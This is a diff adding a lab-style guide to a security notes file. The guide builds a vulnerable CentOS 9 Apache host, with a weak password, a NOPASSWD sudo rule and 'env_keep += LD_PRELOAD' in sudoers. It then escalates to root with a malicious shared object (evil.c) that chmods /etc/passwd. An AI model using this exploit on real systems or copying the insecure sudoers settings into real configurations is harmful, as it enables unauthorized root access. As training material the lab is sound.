@@ -121,3 +121,96 @@ Restrict `sudoers` settings:**
   ```
 And follow least privilege principles to prevent exploitation.
 
+
+# LD_PRELOAD Exploitation and Privilege Escalation on CentOS 9
+
+## Step 1: Install Apache
+Run the following command to install Apache:
+```bash
+yum install httpd -y
+```
+
+## Step 2: Start and Enable Apache Service
+Start the Apache service and enable it to run on boot:
+```bash
+systemctl start httpd
+systemctl enable httpd
+```
+
+## Step 3: Create a User for Apache Management
+Create a new user named `site-admin`:
+```bash
+useradd -m site-admin -s /bin/bash
+```
+
+## Step 4: Grant sudo Permissions to `site-admin`
+Edit the sudoers file:
+```bash
+nano /etc/sudoers
+```
+Add the following line to grant `site-admin` permission to run Apache without a password:
+```bash
+site-admin  ALL=(ALL)   NOPASSWD: /usr/sbin/httpd
+```
+
+## Step 5: Set Password for `site-admin`
+Use the `chpasswd` command to set the password:
+```bash
+echo 'site-admin:123' | chpasswd
+```
+
+## Step 6: Configuring sudoers for LD_PRELOAD Persistence
+Add the following line to `/etc/sudoers` to keep the `LD_PRELOAD` environment variable:
+```bash
+Defaults env_keep += "LD_PRELOAD"
+```
+
+## Step 7: SSH into the Machine and Test Apache
+SSH into the server as `site-admin`:
+```bash
+ssh site-admin@192.168.1.10
+```
+Run Apache commands to verify permissions:
+```bash
+sudo /usr/sbin/httpd
+sudo /usr/sbin/httpd -v
+sudo /usr/sbin/httpd -T
+```
+
+## Step 8: Exploiting LD_PRELOAD for Privilege Escalation
+### Create a Malicious Shared Object (`evil.c`)
+Create and save the following C code as `evil.c`:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void _init() {
+    setuid(0);
+    setgid(0);
+    system("chmod 777 /etc/passwd");
+}
+```
+
+### Compile and Generate Shared Object
+Compile the malicious shared object:
+```bash
+gcc -fPIC -shared -o /tmp/env.so /tmp/evil.c -nostartfiles
+```
+
+### Execute the Exploit
+Run the following command to exploit `LD_PRELOAD`:
+```bash
+sudo LD_PRELOAD=/tmp/env.so /usr/sbin/httpd
+```
+
+## Step 9: Locate Shared Object Files
+To find shared object files on the system, use:
+```bash
+find /lib /lib64 /usr/lib /usr/lib64 -name "*.so*"
+```
+
+---
+This guide covers Apache installation, user management, sudo permissions, and an LD_PRELOAD privilege escalation exploit on CentOS 9. Ensure that security measures are in place to prevent unauthorized privilege escalation.
+
+
+
